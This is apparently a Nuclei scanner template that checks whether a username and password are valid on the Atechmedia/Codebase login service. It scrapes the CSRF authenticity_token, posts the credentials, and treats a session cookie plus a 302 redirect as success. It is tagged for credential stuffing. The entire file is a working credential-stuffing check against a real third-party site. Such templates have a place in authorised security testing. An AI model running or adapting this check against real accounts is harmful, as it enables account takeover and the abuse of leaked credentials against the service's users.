http:
- extractors:
  - attribute: value
    internal: true
    name: authenticity_token
    part: body
    type: xpath
    xpath:
    - /html/body/div/div[2]/div/form/input[2]
  - dsl:
    - username
    - password
    type: dsl
  matchers:
  - part: header
    type: word
    words:
    - 'Set-Cookie: user_session'
  - status:
    - 302
    type: status
  matchers-condition: and
  raw:
  - 'GET https://identity.atechmedia.com/login HTTP/1.1

    Host: identity.atechmedia.com

    Referer: https://identity.atechmedia.com/login

    '
  - 'POST https://identity.atechmedia.com/login HTTP/1.1

    Host: identity.atechmedia.com

    Origin: https://identity.atechmedia.com

    Content-Type: application/x-www-form-urlencoded

    Referer: https://identity.atechmedia.com/login


    utf8=%E2%9C%93&authenticity_token={{url_encode(authenticity_token)}}&username={{username}}&password={{password}}&commit=Login

    '
id: atechmedia-codebase-login-check
info:
  author: parthmalhotra,pdresearch
  description: Checks for a valid Atechmedia/Codebase account.
  metadata:
    max-request: 2
  name: Atechmedia/Codebase Login Check
  reference:
  - https://owasp.org/www-community/attacks/Credential_stuffing
  severity: critical
  tags: cloud,creds-stuffing,login-check,atechmedia,codebase,vuln
self-contained: true
